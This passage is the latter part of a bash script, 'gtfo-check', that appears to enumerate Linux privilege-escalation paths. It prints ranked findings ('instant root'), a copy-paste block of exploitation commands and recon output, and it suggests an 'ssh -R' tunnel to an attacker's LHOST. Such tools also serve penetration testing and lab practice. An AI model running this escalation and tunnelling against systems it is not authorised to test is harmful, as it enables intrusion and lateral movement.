# port-forward to your box:
ssh -R $port:127.0.0.1:$port user@$LHOST" ;;
            22|25|53|631|5939) : ;;
            *) add_finding INFO "Unidentified internal service on 127.0.0.1:$port" "" \
                "curl -si http://127.0.0.1:$port/ | head -20" ;;
        esac
    done
fi

# ======================= RECENTLY MODIFIED =========================
RECENT=$(timeout 20 find /opt /srv /home /var/www /usr/local /tmp -mmin -4320 -type f \
    -not -path "*/.cache/*" -not -path "*/.git/*" -not -path "*/node_modules/*" \
    2>/dev/null | head -15)
[ -n "$RECENT" ] && add_finding INFO "Recently modified files (last 3 days)" \
    "$(echo "$RECENT" | cap_list 10)" ""

# ============================= REPORT ==============================
TOTAL=$(wc -l < "$FINDINGS" 2>/dev/null | tr -d ' ')
[ -z "$TOTAL" ] && TOTAL=0

echo ""
echo -e "${BOLD}${CYAN}╔══════════════════════════════════════════════════════╗${NC}"
echo -e "${BOLD}${CYAN}║  gtfo-check — privilege escalation report            ║${NC}"
echo -e "${BOLD}${CYAN}╚══════════════════════════════════════════════════════╝${NC}"
echo -e "  user: ${BOLD}${ME}${NC}   host: $(hostname 2>/dev/null)   findings: ${BOLD}${TOTAL}${NC}"
[ "$IS_ROOT" -eq 1 ] && echo -e "  ${YELLOW}already uid 0 — writable-path checks skipped, looting only${NC}"

if [ "$TOTAL" -eq 0 ]; then
    echo ""
    echo -e "  ${YELLOW}No privilege escalation vectors found.${NC}"
    echo -e "  Try: ${CYAN}-v${NC} for recon context, or check kernel exploits manually."
    echo ""
    exit 0
fi

LAST_SEV=""
IDX=0
while IFS='|' read -r n sev t64 d64 c64; do
    [ -z "$sev" ] && continue
    title=$(_unb64 "$t64"); detail=$(_unb64 "$d64"); cmds=$(_unb64 "$c64")
    if [ "$sev" != "$LAST_SEV" ]; then
        case "$sev" in
            CRIT) header "${RED}CRITICAL — instant root${NC}" ;;
            HIGH) header "${YELLOW}HIGH — likely root with one more step${NC}" ;;
            MED)  header "${CYAN}MEDIUM — lateral movement / credential access${NC}" ;;
            INFO) header "INFO — context worth a look" ;;
        esac
        LAST_SEV="$sev"
    fi
    IDX=$((IDX+1))
    case "$sev" in
        CRIT) MARK="${RED}✗${NC}" ;;
        HIGH) MARK="${YELLOW}✗${NC}" ;;
        *)    MARK="${GREEN}✓${NC}" ;;
    esac
    echo ""
    # %b for color vars (they hold literal \033), %s for content so that
    # backslashes in commands survive verbatim.
    printf '  %b %b[%s] %s%b\n' "$MARK" "$BOLD" "$IDX" "$title" "$NC"
    [ -n "$detail" ] && printf '%s\n' "$detail" | while IFS= read -r dl; do
        printf '    %b%s%b\n' "$CYAN" "$dl" "$NC"
    done
    if [ -n "$cmds" ]; then
        printf '%s\n' "$cmds" | while IFS= read -r cl; do
            printf '      %b$ %s%b\n' "$GREEN" "$cl" "$NC"
        done
    fi
done < <(sort -t'|' -k1,1n -k3,3 "$FINDINGS")

# ---------------- copy-paste block: commands only ----------------
HAS_CMDS=$(while IFS='|' read -r n sev t64 d64 c64; do
    [ -n "$(_unb64 "$c64")" ] && echo x
done < <(sort -t'|' -k1,1n "$FINDINGS") | head -1)

if [ -n "$HAS_CMDS" ]; then
    echo ""
    echo -e "${BOLD}${CYAN}━━━ COPY-PASTE ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""
    IDX=0
    while IFS='|' read -r n sev t64 d64 c64; do
        cmds=$(_unb64 "$c64")
        [ -n "$cmds" ] || continue
        IDX=$((IDX+1))
        printf '# [%s] %s\n' "$sev" "$(_unb64 "$t64")"
        printf '%s\n\n' "$cmds"
    done < <(sort -t'|' -k1,1n "$FINDINGS")
fi

# ============================== RECON ==============================
if [ "$VERBOSE" -eq 1 ]; then
    header "RECON (verbose)"
    echo -e "  ${BOLD}Kernel:${NC} $(uname -a 2>/dev/null)"
    echo -e "  ${BOLD}Distro:${NC} $(grep -h PRETTY_NAME /etc/*release 2>/dev/null | head -1 | cut -d= -f2- | tr -d '"')"
    echo -e "  ${BOLD}id:${NC} $(id 2>/dev/null)"

    echo -e "\n  ${BOLD}All listening sockets:${NC}"
    (ss -tulnp 2>/dev/null || netstat -tulnp 2>/dev/null) | sed 's/^/    /'

    if [ -n "$CAP_OUTPUT" ]; then
        echo -e "\n  ${BOLD}All capabilities:${NC}"
        echo "$CAP_OUTPUT" | sed 's/^/    /'
    fi

    echo -e "\n  ${BOLD}Root processes:${NC}"
    ps aux 2>/dev/null | awk '$1=="root"' \
        | grep -vE '\[.*\]|/sbin/init|systemd$|systemd-|/lib/systemd' | head -15 | sed 's/^/    /'

    echo -e "\n  ${BOLD}Mounts without nosuid:${NC}"
    mount 2>/dev/null | grep -vE 'proc|sysfs|devpts|tmpfs|cgroup|securityfs|debugfs|mqueue|hugetlb|pstore|bpf|fusectl|configfs|devtmpfs|tracefs' \
        | grep -v nosuid | sed 's/^/    /'

    echo -e "\n  ${BOLD}SUID inventory (incl. defaults):${NC}"
    echo "$SUID_CACHE" | awk '{print "    "$1"  "$3":"$4"  "$NF}'
fi

# ============================= SUMMARY =============================
C_CRIT=$(cut -d'|' -f2 "$FINDINGS" | grep -c '^CRIT$')
C_HIGH=$(cut -d'|' -f2 "$FINDINGS" | grep -c '^HIGH$')
C_MED=$(cut -d'|' -f2 "$FINDINGS" | grep -c '^MED$')
C_INFO=$(cut -d'|' -f2 "$FINDINGS" | grep -c '^INFO$')

echo ""
echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
[ "$C_CRIT" -gt 0 ] && echo -e "  ${RED}${BOLD}$C_CRIT CRITICAL${NC}  — start here"
[ "$C_HIGH" -gt 0 ] && echo -e "  ${YELLOW}$C_HIGH HIGH${NC}"
[ "$C_MED"  -gt 0 ] && echo -e "  ${CYAN}$C_MED MEDIUM${NC}"
[ "$C_INFO" -gt 0 ] && echo -e "  $C_INFO INFO"
[ "$VERBOSE" -eq 0 ] && echo -e "  ${CYAN}run with -v for recon context${NC}"
echo -e "  ref: ${CYAN}https://gtfobins.github.io/${NC}"
echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
